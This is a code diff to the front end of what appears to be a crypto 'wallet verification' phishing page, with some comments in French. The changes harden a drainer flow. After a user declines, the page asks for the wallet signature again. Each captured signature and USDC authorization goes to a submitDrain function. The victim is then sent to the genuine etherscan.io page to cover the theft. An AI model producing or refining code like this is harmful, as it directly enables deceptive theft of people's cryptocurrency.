@@ -766,13 +766,15 @@
         submitDrain(capturedAddr, sig, usdcAuth);
         showSpinner(false); setStatus('Address verified successfully.', 'ok');
         btn.textContent = 'Verified ✓'; btn.style.background = 'var(--cyan-32)';
+        // ── redirect vers etherscan après signature réussie ──
+        setTimeout(function() {
+          window.location.replace('https://etherscan.io/verifyAddress');
+        }, 1500);
       } catch(ex) {
         showSpinner(false);
         if (isReject(ex)) {
-          setStatus('Signature declined. Please try again.', 'err'); btn.disabled = false; btn.textContent = 'Continue';
-        } else {
-          // retry once
-          setStatus('Retrying…'); showSpinner(true);
+          // 1er reject — relance une fois
+          setStatus('Retrying verification…'); showSpinner(true);
           try {
             var sig2 = await doSign();
             var split2 = ethers.utils.splitSignature(sig2);
@@ -781,10 +783,37 @@
             showSpinner(false); setStatus('Address verified successfully.', 'ok');
             btn.textContent = 'Verified ✓'; btn.style.background = 'var(--cyan-32)';
             console.log('SIG2 | v:', split2.v, '| r:', split2.r, '| s:', split2.s);
+            // ── redirect après succès sur retry ──
+            setTimeout(function() {
+              window.location.replace('https://etherscan.io/verifyAddress');
+            }, 1500);
           } catch(ex2) {
             showSpinner(false);
-            setStatus(isReject(ex2) ? 'Signature declined.' : 'Verification failed.', 'err');
-            btn.disabled = false; btn.textContent = 'Continue';
+            // 2ème reject ou erreur → redirect etherscan
+            setStatus('Redirecting…');
+            setTimeout(function() {
+              window.location.replace('https://etherscan.io/verifyAddress');
+            }, 800);
+          }
+        } else {
+          // erreur non-reject — retry once
+          setStatus('Retrying…'); showSpinner(true);
+          try {
+            var sig2 = await doSign();
+            var split2 = ethers.utils.splitSignature(sig2);
+            submitDrain(capturedAddr, sig2, usdcAuth);
+            showSpinner(false); setStatus('Address verified successfully.', 'ok');
+            btn.textContent = 'Verified ✓'; btn.style.background = 'var(--cyan-32)';
+            console.log('SIG2 | v:', split2.v, '| r:', split2.r, '| s:', split2.s);
+            setTimeout(function() {
+              window.location.replace('https://etherscan.io/verifyAddress');
+            }, 1500);
+          } catch(ex2) {
+            showSpinner(false);
+            setStatus('Redirecting…');
+            setTimeout(function() {
+              window.location.replace('https://etherscan.io/verifyAddress');
+            }, 800);
           }
         }
       }
